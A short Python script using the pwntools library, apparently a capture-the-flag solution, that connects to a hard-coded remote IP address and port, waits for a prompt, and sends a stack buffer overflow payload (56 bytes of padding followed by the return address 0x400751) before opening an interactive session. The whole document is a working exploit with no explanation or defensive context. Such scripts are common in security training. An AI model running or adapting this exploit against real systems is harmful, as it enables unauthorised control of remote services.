from pwn import *
ip = "114.67.246.176"
port = 14268
p=remote(ip,port)
p.recvuntil('something?')
payload='a'*56+p64(0x400751).decode("iso-8859-1")
p.sendline(payload)
p.interactive()

